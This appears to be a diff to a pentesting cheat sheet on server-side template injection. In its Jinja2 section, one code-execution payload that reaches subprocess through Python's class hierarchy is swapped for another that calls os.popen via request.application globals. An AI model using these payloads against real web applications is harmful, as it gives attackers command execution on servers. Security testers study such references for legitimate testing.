@@ -17,7 +17,7 @@ but in Jinja2 the output would be 7777777
 ### Jinja2 specifically
 when you confirm that jinja is being used you can do the following
 ```
-{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 if you want to pass arguments pass a list instead
 ## Jade/Pug
